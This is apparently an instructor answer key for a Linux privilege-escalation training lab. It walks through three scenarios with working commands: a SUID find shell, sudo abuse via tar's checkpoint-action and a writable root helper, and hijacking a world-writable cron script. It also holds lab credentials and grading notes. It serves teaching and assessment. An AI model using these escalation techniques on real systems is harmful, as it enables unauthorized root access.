# Instructor solutions — DO NOT DISTRIBUTE TO PARTICIPANTS

Complete flight paths for the three scenarios, expected output, common mistakes
and grading notes. Keep this file out of any material given to students.

---

## 0. Environment summary

| Item | Value |
|---|---|
| Entry account | `labuser` / `LabUser!2026` |
| Intermediate account | `labpriv` (locked password, reachable via sudo) |
| Owner account | `adminlab` (never shared) |
| Web app | Juice Shop 17.1.1 on port 3000 |
| Flags | `user.txt` (labuser), `privilege.txt` (root:labpriv), `root.txt` (root) |

All paths below assume the default `config/lab.conf`.

---

## Scenario A — insecure file permissions

**Injected:** SUID bit on `/usr/bin/find`; `/opt/vulnserver/lab/perms` is `0777`.

**Solution**

Because the SUID bit is set on `find`, it runs with euid 0 and can execute a
shell while preserving that euid (`-p`):

```bash
# as labuser
id
find / -maxdepth 1 -perm -4000 -type f 2>/dev/null      # discovery
/usr/bin/find /tmp -maxdepth 0 -exec /bin/sh -p -c 'id' \;   # euid=0
/usr/bin/find /tmp -maxdepth 0 -exec /bin/sh -p -c 'cat /opt/vulnserver/flags/root.txt' \;
```

GTFOBins documents the technique for `find`; `vim`, `less`, `nmap`, `awk` are
equivalent if the instructor changes `SCENARIO_A_SUID_BINARY`.

The `0777` directory is informational: it is where the "backup routine" notes
live, and it shows how a writable path becomes dangerous when a privileged
context uses it (that is exactly Scenario C's failure mode, so expect students to
connect them).

**Expected evidence:** `uid=0(root)` output and the ROOT flag, both produced from
the `labuser` session.

**Common mistakes**

- Running `find ... -exec sh -c ...` without `-p`: the shell drops the elevated
  euid and `id` still shows `labuser` (bash drops privileges; dash may not).
- Reporting the world-writable directory as "the vulnerability that gave root"
  without demonstrating execution.

---

## Scenario B — insecure sudo delegation

**Injected** in `/etc/sudoers.d/vulnserver-lab-b`:

```
labuser  ALL=(labpriv) NOPASSWD: /usr/bin/tar, /usr/bin/cat
labpriv ALL=(root)   NOPASSWD: /usr/local/bin/lab-healthcheck
```

and `/usr/local/bin/lab-healthcheck` is `root:labpriv 0774`.

**Stage 1 — labuser → labpriv (PRIVILEGE flag)**

```bash
sudo -l
# (labuser) NOPASSWD: /usr/bin/tar, /usr/bin/cat
sudo -u labpriv /usr/bin/cat /opt/vulnserver/flags/privilege.txt
# or a shell via tar's checkpoint action:
sudo -u labpriv /usr/bin/tar -cf /dev/null /dev/null \
     --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

`cat` alone is enough for the flag; a shell is needed for stage 2 and is the
"real" lesson (tar executes arbitrary commands).

**Stage 2 — labpriv → root (ROOT flag)**

The delegated account can write the root-executed helper:

```bash
# as labpriv (e.g. inside the tar shell)
ls -l /usr/local/bin/lab-healthcheck        # -rwxrwxr-- root labpriv
printf '#!/bin/bash\ncat /opt/vulnserver/flags/root.txt > /tmp/rootproof\nchmod 644 /tmp/rootproof\n' \
    > /usr/local/bin/lab-healthcheck
sudo -n /usr/local/bin/lab-healthcheck      # allowed NOPASSWD, runs as root
cat /tmp/rootproof
```

Note the sudo policy re-reads the script each execution, so the modification takes
effect immediately. `Defaults log_input, log_output` means the whole session is
recorded in `/var/log/sudo-vulnserver.log` — useful when grading.

**Expected evidence:** `sudo -l` output, PRIVILEGE flag as `labpriv`, modified
helper content, ROOT flag produced by a root-owned process.

**Common mistakes**

- Trying `sudo -u labpriv tar ...` with an unlisted command (sudo denies it).
- Forgetting that the helper is group-writable, not world-writable: only
  `labpriv` can modify it.
- Editing the helper from the `labuser` session without escalating first.

---

## Scenario C — insecure cron

**Injected:** `/etc/cron.d/vulnserver-lab-c` runs
`/opt/vulnserver/lab/cron/lab-cleanup.sh` as root every minute; the directory is
`0777`.

**Solution (rename attack)**

```bash
# as labuser
ls -la /opt/vulnserver/lab/cron
mv /opt/vulnserver/lab/cron/lab-cleanup.sh /opt/vulnserver/lab/cron/orig.sh
printf '#!/bin/bash\nid > /tmp/cron-id\ncat /opt/vulnserver/flags/root.txt > /tmp/cron-root\nchmod 644 /tmp/cron-*\n' \
    > /opt/vulnserver/lab/cron/lab-cleanup.sh
chmod 755 /opt/vulnserver/lab/cron/lab-cleanup.sh
# wait up to 60 seconds
cat /tmp/cron-id      # uid=0(root)
cat /tmp/cron-root    # ROOT flag
```

An edit-in-place (`echo >> lab-cleanup.sh`) also works; `mv` is more reliable
because it replaces the inode regardless of the file's own permissions.

**Expected evidence:** directory listing showing `0777`, replacement file,
`uid=0` output, ROOT flag, and the cron log line in
`/var/log/lab-cleanup.log` / `journalctl -u cron`.

**Common mistakes**

- Waiting less than a minute and concluding it failed.
- Replacing the file but leaving it non-executable (cron logs `Permission denied`).
- Trying to `chmod` the original script instead of replacing it.

---

## Cross-cutting findings students are expected to report

| Finding | How to observe |
|---|---|
| Weak/shared lab credentials | documented password, no key required |
| SSH password authentication enabled | `ssh -v`, `sshd -T` if readable |
| Juice Shop unknown version disclosure | `GET /rest/admin/application-version` |
| No MFA, no login rate limiting on the lab account | repeated SSH attempts |
| Container published on all interfaces | `docker port`/`ss -ltn` from another host |
| Audit logs unreadable by the participant | correct design, worth noting |

## Grading rubric

| Item | Points |
|---|---|
| USER flag + evidence | 20 |
| PRIVILEGE flag via the delegation (Scenario B) | 20 |
| ROOT flag with reproducible path | 25 |
| Additional findings with severity reasoning | 15 |
| Remediation recommendations that would actually work | 15 |
| Scope discipline, cleanup, report quality | 5 |

Deduct for: attacking out-of-scope hosts, leaving persistence, deleting logs,
fabricated evidence.

## Expected timing

| Phase | Time |
|---|---|
| Enumeration | 20–40 min |
| Scenario B stage 1 | 10–20 min |
| Any root path | 10–30 min |
| Report | 45–60 min |

If a group finds root in under five minutes, confirm they did not simply read
`root.txt` from a pre-existing session or use an out-of-band channel. If a group
finds nothing in 90 minutes, hint at `sudo -l` (Scenario B) — it is the intended
entry to the privilege chain.

## Resetting between groups

```bash
sudo ./reset-lab.sh --yes          # deactivates, cleans, rotates flags
sudo ./lab-manager.sh activate all # or leave inactive and let the owner decide
```

Flags are rotated, so evidence from a previous group cannot be reused.
